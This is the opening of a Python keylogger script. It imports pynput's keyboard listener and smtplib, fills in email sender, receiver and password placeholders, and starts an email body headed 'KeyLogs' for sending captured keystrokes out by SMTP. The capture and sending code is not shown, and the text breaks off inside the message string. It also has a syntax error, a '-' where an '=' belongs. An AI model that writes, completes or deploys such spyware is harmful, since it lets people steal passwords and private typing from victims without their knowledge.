from pynput import keyboard
import smtplib,ssl
sender_mail = "user@domain.com"     # Replace user@domain.com with your email id (everywhere)
#prefer using your own email id for reciever's as well.
reciever_mail - "user@domain.com"   # Replace user@domain.com with your email id (everywhere)
password = "passcode"               #Enter your Password here
port = 587
message = """From: user@domain.com
To: user@domain.com
Subject: KeyLogs


Text: Keylogs
